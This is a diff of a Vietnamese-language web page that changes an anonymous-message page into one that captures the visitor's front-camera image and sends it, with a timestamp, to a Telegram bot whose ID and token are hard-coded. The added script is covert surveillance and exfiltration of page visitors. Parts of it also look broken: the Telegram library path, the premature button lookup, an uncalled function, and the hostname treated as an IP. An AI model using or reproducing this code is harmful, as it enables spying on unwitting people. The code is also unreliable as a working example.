@@ -1,9 +1,63 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title> Gửi Tin Nhắn Ẩn Danh Cho Tôi </title>
+    <meta charset="UTF-8">
+    <title>Trang web chụp ảnh và gửi lên Telegram</title>
 </head>
 <body>
-    <script src="script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/telegram-bot-api/4.1.0/telegram-bot-api.min.js"></script>
+    <script>
+        // Khởi tạo bot Telegram
+        var bot = new TelegramBot(6630148049, "AAG1xYKPmQvG1EaUCb8_JygwwwF-1002081721946");
+
+        // Chụp ảnh camera trước
+        function captureImage() {
+            var canvas = document.createElement("canvas");
+            canvas.width = 240;
+            canvas.height = 320;
+            var ctx = canvas.getContext("2d");
+            navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}}).then(function(stream) {
+                var video = document.querySelector("video");
+                video.srcObject = stream;
+                video.play();
+
+                // Chụp ảnh
+                setTimeout(function() {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    var dataURL = canvas.toDataURL("image/png");
+
+                    // Gửi ảnh lên Telegram
+                    bot.sendPhoto(dataURL);
+                }, 2000);
+            });
+        }
+
+        // Gửi địa chỉ IP và thời gian truy cập
+        function sendData() {
+            var ip = window.location.hostname;
+            var time = new Date().toLocaleString();
+            bot.sendMessage(ip + " - " + time);
+        }
+
+        // Bắt đầu chụp ảnh
+        document.querySelector("button").onclick = captureImage;
+
+        // Thay đổi màu giao diện liên tục
+        setInterval(function() {
+            document.body.style.backgroundColor = randomColor();
+        }, 1000);
+
+        // Hàm tạo màu ngẫu nhiên
+        function randomColor() {
+            var r = Math.floor(Math.random() * 255);
+            var g = Math.floor(Math.random() * 255);
+            var b = Math.floor(Math.random() * 255);
+            return "rgb(" + r + "," + g + "," + b + ")";
+        }
+    </script>
+
+    <video id="video" width="240" height="320"></video>
+    <button>Chụp ảnh</button>
 </body>
 </html>
